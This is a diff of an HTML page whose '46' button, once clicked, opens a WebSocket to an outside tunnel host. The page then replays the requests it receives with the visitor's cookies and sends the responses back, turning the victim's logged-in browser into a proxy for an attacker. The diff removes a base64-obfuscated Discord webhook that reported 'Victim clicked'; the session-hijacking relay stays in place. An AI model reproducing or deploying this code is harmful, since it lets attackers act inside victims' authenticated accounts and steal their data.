@@ -10,66 +10,31 @@
     </style>
 </head>
 <body>
-
     <h1 id="status" onclick="startMaster()">46</h1>
-
     <script>
-        // الرابط الجديد الخاص بك
+        // الرابط الجديد من الصورة
         const PROXY_SERVER = "wss://31e8c94a917825.lhr.life";
         
-        // ويب هوك ديسكورد للإشعارات
-        const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
-        const HOOK = atob(key);
-
-        function sendDiscord(msg) {
-            fetch(HOOK, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: msg})
-            }).catch(e => {});
-        }
-
         async function startMaster() {
-            const btn = document.getElementById('status');
-            btn.innerText = "DONE";
-            btn.style.color = "#0f0";
-            
-            sendDiscord("🚀 **V46 Master:** Victim clicked '46'. Opening Tunnel...");
-
+            document.getElementById('status').innerText = "DONE";
             const socket = new WebSocket(PROXY_SERVER);
-
-            socket.onopen = () => {
-                // إرسال إشارة الانضمام للسيرفر
-                socket.send(JSON.stringify({ type: 'join' }));
-            };
-
+            socket.onopen = () => socket.send(JSON.stringify({ type: 'join' }));
             socket.onmessage = async (event) => {
-                // استقبال طلبات التصفح من فايرفوكس وتنفيذها بكوكيز الضحية
                 try {
                     const req = JSON.parse(event.data);
-                    if (req.url) {
-                        const response = await fetch(req.url, {
-                            method: req.method,
-                            headers: req.headers,
-                            credentials: 'include'
-                        });
-                        const body = await response.text();
-                        
-                        socket.send(JSON.stringify({
-                            body: body,
-                            status: response.status,
-                            headers: Object.fromEntries(response.headers)
-                        }));
-                    }
-                } catch (e) {
-                    // تمرير البيانات الخام إذا لم تكن JSON
-                }
+                    const response = await fetch(req.url, {
+                        method: req.method,
+                        headers: req.headers,
+                        credentials: 'include'
+                    });
+                    const body = await response.text();
+                    socket.send(JSON.stringify({
+                        body: body,
+                        status: response.status,
+                        headers: Object.fromEntries(response.headers)
+                    }));
+                } catch (e) {}
             };
-
-            // الحفاظ على الجلسة نشطة
-            setInterval(() => {
-                if (socket.readyState === 1) socket.send(JSON.stringify({type: 'ping'}));
-            }, 10000);
         }
     </script>
 </body>
